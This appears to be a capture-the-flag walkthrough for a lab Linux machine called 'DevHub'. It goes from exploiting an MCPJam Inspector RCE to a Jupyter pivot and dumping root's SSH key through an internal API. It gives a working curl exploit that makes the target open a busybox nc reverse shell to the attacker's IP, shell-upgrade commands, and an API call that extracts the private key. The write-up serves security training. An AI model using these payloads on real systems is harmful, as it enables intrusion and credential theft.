📝 Description
DevHub is a Linux machine that demonstrates the risks of exposed local development interfaces and insecure internal API endpoints. The exploitation path involves exploiting a Remote Code Execution (RCE) in an exposed MCPJam Inspector instance, pivoting through an internal Jupyter Notebook environment, and exploiting an operational API to dump private SSH keys for local privilege escalation to root.

🛠️ Skills Covered
Reconnaissance & Port Scanning

Exploiting Exposed Development Frameworks (CVE-2026-23744)

Port Forwarding & Tunneling

Reverse Shell Stabilization (PTY Upgrade)

Lateral Movement via Jupyter Notebook

Internal API Analysis & Exploitation (Privilege Escalation)

🔍 Walkthrough
1. Reconnaissance
An initial Nmap scan reveals three open ports:

Bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1
80/tcp   open  http    nginx 1.18.0
6274/tcp open  unknown (MCPJam Inspector v1.4.2)
2. Initial Access (mcp-dev)
The service on port 6274 is identified as MCPJam Inspector v1.4.2, which is vulnerable to Remote Code Execution via arbitrary server installation (CVE-2026-23744).

By sending a crafted POST request to /api/mcp/connect, we can force the application to execute a reverse shell payload using the built-in busybox network utility:

Bash
curl -X POST -k \
-H "Content-Type: application/json" \
-d '{
        "serverConfig": {
                "command": "busybox",
                "args": ["nc", "<YOUR_IP>", "4444", "-e", "/bin/bash"],
                "env": {}
        },
        "serverId": "asdkjfaskdjnf"
}' http://devhub.htb:6274/api/mcp/connect
Catching the shell on our local listener grants initial access as the mcp-dev user.

3. Shell Stabilization
To ensure command history, auto-completion, and full interactive control without losing the shell on accidental keypresses (Ctrl+C), the TTY shell is upgraded using Python:

Bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
4. Lateral Movement (analyst)
Checking internal network connections (ss -tunlp) reveals a service listening locally on port 8888. Inspecting running processes reveals it is a Jupyter Lab instance running under the context of the analyst user:

Bash
analyst    1071  0.0  2.4 /home/analyst/jupyter-env/bin/python3 ... --port=8888 --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
By setting up a local port forward or utilizing an internal terminal interface via the exposed token, we execute a secondary Python reverse shell to pivot into the analyst user context.

5. Privilege Escalation (root)
Enumerating the system as analyst reveals an internal Python administration API (/opt/opsmcp/server.py) running locally on port 5000 as the root user.

Reviewing the source code reveals a valid hardcoded API key (opsmcp_secret_key_4f5a6b7c8d9e0f1a) and a hidden administrative endpoint (ops._admin_dump) capable of pulling sensitive targets if the confirmation flag is set to true.

We query the local endpoint to safely extract the root private key directly into a temporary file, eliminating formatting or clipboard syntax corruption:

Bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
-H "Content-Type: application/json" \
-H "X-Api-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
-d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}' \
| python3 -c "import sys, json; print(json.load(sys.stdin)['root_private_key'])" > /tmp/root.key
6. Flags Acquisition
With the private key successfully dumped, we secure its permissions and log in via SSH to loopback:

Bash
chmod 600 /tmp/root.key
ssh -i /tmp/root.key root@127.0.0.1 -o StrictHostKeyChecking=no
🏁 Root Flag
Bash
root@devhub:~# cat /root/root.txt
[REDACTED_ROOT_FLAG]
